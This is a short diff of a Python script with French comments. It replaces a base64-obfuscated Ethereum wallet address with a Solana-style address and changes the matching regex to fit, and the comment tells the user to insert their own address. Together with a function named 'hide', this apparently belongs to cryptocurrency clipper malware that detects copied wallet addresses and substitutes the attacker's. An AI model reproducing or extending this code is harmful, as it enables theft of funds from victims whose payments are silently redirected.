@@ -7,9 +7,9 @@ import sys
 import base64
 
 # Ton adresse encodée en base64 (remplace par la tienne)
-A1 = base64.b64decode("MHhiOGI5Q2M4QmI1MmJhRTU4Q2VCQjdjYTc4NDVlRGM2NDIzYjY0ODRk").decode()
+A1 = base64.b64decode("Mm9jRFhHN1lYVUNLUVpTeDJNOEp5S1QzaGJra1dGNDhUcmhUSlZKTGJmWkI").decode()
 
-REG = r'^0x[a-fA-F0-9]{40}$'
+REG = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
 
 def cacher():
     try:
